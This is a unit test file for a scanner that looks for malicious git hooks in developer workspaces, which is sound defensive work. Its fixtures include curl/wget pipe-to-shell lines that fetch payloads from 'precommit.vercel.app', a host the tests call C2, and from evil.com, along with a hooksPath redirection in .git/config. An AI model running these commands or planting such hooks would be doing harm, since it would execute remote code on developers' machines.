/**
 * Unit tests for hook-scanner (static workspace git-hook scan)
 */

import { expect } from 'chai';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import {
  collectScanTargets,
  isMaliciousGitHookContent,
  matchHookFile,
  parseCoreHooksPath,
  scanWorkspaceRoot,
} from '../../monitor/analysis/hook-scanner';

suite('HookScanner Tests', () => {
  const workspaceRoot = '/home/user/project';

  suite('matchHookFile', () => {
    test('should detect curl pipe-to-shell in .husky/pre-commit', () => {
      const filePath = path.join(workspaceRoot, '.husky', 'pre-commit');
      const content = "curl -s 'https://precommit.vercel.app/settings/linux?flag=5' | sh";
      const match = matchHookFile(filePath, content);

      expect(match).to.exist;
      expect(match!.rule.name).to.equal('Malicious Git Hooks Write');
    });

    test('should detect wget payload in .githooks/pre-commit', () => {
      const filePath = path.join(workspaceRoot, '.githooks', 'pre-commit');
      const content = "wget -qO- 'https://evil.com/payload' | sh";
      const match = matchHookFile(filePath, content);

      expect(match).to.exist;
      expect(match!.rule.name).to.equal('Malicious Git Hooks Write');
    });

    test('should detect post-checkout hook in .git/hooks', () => {
      const filePath = path.join(workspaceRoot, '.git', 'hooks', 'post-checkout');
      const content = 'curl -s https://precommit.vercel.app/settings/mac | sh';
      const match = matchHookFile(filePath, content);

      expect(match).to.exist;
    });

    test('should NOT flag benign lint-staged hook', () => {
      const filePath = path.join(workspaceRoot, '.husky', 'pre-commit');
      const match = matchHookFile(filePath, 'npx lint-staged');

      expect(match).to.be.null;
    });

    test('should NOT flag curl-only hook without pipe-to-shell', () => {
      const filePath = path.join(workspaceRoot, '.husky', 'pre-commit');
      const match = matchHookFile(filePath, 'curl -s https://example.com/docs/readme.md');

      expect(match).to.be.null;
    });

    test('should detect known C2 host without pipe-to-shell', () => {
      const filePath = path.join(workspaceRoot, '.husky', 'pre-commit');
      const match = matchHookFile(filePath, 'echo precommit.vercel.app');

      expect(match).to.exist;
      expect(match!.rule.name).to.equal('Malicious Git Hooks Write');
    });

    test('should detect .githooks hooksPath in .git/config', () => {
      const filePath = path.join(workspaceRoot, '.git', 'config');
      const content = '[core]\n\thooksPath = .githooks\n';
      const match = matchHookFile(filePath, content);

      expect(match).to.exist;
      expect(match!.rule.name).to.equal('Git Config Core Hooks Write');
    });

    test('should NOT flag husky hooksPath in .git/config', () => {
      const filePath = path.join(workspaceRoot, '.git', 'config');
      const match = matchHookFile(filePath, '[core]\n\thooksPath = .husky/_\n');

      expect(match).to.be.null;
    });
  });

  suite('isMaliciousGitHookContent', () => {
    test('should match downloader plus pipe-to-shell', () => {
      expect(isMaliciousGitHookContent("wget -qO- 'https://evil.com/x' | sh")).to.be.true;
    });

    test('should match known C2 host alone', () => {
      expect(isMaliciousGitHookContent('https://precommit.vercel.app/settings/linux')).to.be.true;
    });

    test('should not match downloader without pipe', () => {
      expect(isMaliciousGitHookContent('curl -s https://example.com')).to.be.false;
    });

    test('should not match benign lint-staged', () => {
      expect(isMaliciousGitHookContent('npx lint-staged')).to.be.false;
    });
  });

  suite('parseCoreHooksPath', () => {
    test('should parse hooksPath value', () => {
      expect(parseCoreHooksPath('[core]\n\thooksPath = .githooks\n')).to.equal('.githooks');
    });

    test('should parse quoted hooksPath', () => {
      expect(parseCoreHooksPath('hooksPath = ".husky"\n')).to.equal('.husky');
    });

    test('should return null when hooksPath absent', () => {
      expect(parseCoreHooksPath('[user]\n\tname = test\n')).to.be.null;
    });
  });

  suite('collectScanTargets (filesystem)', () => {
    let tmpRoot: string;

    setup(() => {
      tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'ide-shepherd-hook-scan-'));
    });

    teardown(() => {
      fs.rmSync(tmpRoot, { recursive: true, force: true });
    });

    test('should include standard hook dirs and .git/config', () => {
      const huskyDir = path.join(tmpRoot, '.husky');
      const gitDir = path.join(tmpRoot, '.git');
      fs.mkdirSync(huskyDir, { recursive: true });
      fs.mkdirSync(gitDir, { recursive: true });
      fs.writeFileSync(path.join(huskyDir, 'pre-commit'), '#!/bin/sh\nexit 0');
      fs.writeFileSync(path.join(huskyDir, 'pre-commit.sample'), '# sample');
      fs.writeFileSync(path.join(gitDir, 'config'), '[core]\n');

      const targets = collectScanTargets(tmpRoot);

      expect(targets).to.include(path.join(gitDir, 'config'));
      expect(targets).to.include(path.join(huskyDir, 'pre-commit'));
      expect(targets).to.not.include(path.join(huskyDir, 'pre-commit.sample'));
    });

    test('should follow custom core.hooksPath directory', () => {
      const gitDir = path.join(tmpRoot, '.git');
      const customHooksDir = path.join(tmpRoot, '.githooks');
      fs.mkdirSync(gitDir, { recursive: true });
      fs.mkdirSync(customHooksDir, { recursive: true });
      fs.writeFileSync(path.join(gitDir, 'config'), '[core]\n\thooksPath = .githooks\n');
      fs.writeFileSync(path.join(customHooksDir, 'pre-commit'), '#!/bin/sh\nexit 0');

      const targets = collectScanTargets(tmpRoot);

      expect(targets).to.include(path.join(customHooksDir, 'pre-commit'));
    });
  });

  suite('scanWorkspaceRoot (filesystem)', () => {
    let tmpRoot: string;

    setup(() => {
      tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'ide-shepherd-hook-scan-'));
    });

    teardown(() => {
      fs.rmSync(tmpRoot, { recursive: true, force: true });
    });

    test('should return matches for malicious hooks on disk', () => {
      const customHooksDir = path.join(tmpRoot, '.githooks');
      const gitDir = path.join(tmpRoot, '.git');
      fs.mkdirSync(customHooksDir, { recursive: true });
      fs.mkdirSync(gitDir, { recursive: true });
      fs.writeFileSync(
        path.join(customHooksDir, 'pre-commit'),
        "wget -qO- 'https://precommit.vercel.app/settings/linux' | sh",
      );
      fs.writeFileSync(path.join(gitDir, 'config'), '[core]\n');

      const matches = scanWorkspaceRoot(tmpRoot);

      expect(matches).to.have.length(1);
      expect(matches[0].filePath).to.equal(path.join(customHooksDir, 'pre-commit'));
    });
  });
});
